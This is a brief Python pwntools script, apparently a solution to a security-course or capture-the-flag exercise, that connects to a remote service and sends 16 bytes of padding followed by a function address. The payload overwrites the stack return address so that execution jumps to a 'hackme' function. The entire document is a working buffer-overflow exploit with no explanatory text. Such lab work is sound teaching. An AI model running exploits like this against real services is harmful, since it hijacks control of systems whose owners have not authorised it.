from pwn import *

context.log_level = 'debug'

HOST = 'inf226.puffling.no'
PORT = 6101
hackme_addr = 0x401216

io = remote(HOST, PORT)


padding = b'A' * 16
payload = padding + p64(hackme_addr)

io.send(payload)
io.shutdown('out')

print(str(io.readall(timeout=2), 'ascii', errors='replace'))

